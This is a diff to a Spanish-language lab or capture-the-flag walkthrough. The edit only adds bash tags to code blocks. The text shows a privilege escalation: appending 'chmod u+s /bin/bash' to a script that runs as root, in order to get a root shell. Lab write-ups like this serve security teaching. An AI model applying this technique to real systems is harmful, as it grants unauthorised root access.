@@ -178,7 +178,7 @@ ssh penguin@172.17.0.2
 Sin ir muy lejos, vemos dos archivos en el directorio del usuario Penguin, y como vemos, el script se está ejecutando como root. 
 Veamos que contienen.
 
-~~~
+~~~ bash
 ls -lah
 cat archivo.txt
 cat script.sh
@@ -187,7 +187,7 @@ cat script.sh
 
 Lo unico que tenemos que hacer es modificar el script para que nos devuelva una shell como root al ejecutarlo.
 
-~~~
+~~~ bash
 echo 'chmod u+s /bin/bash' >> script.sh
 ~~~
 ![echo]()
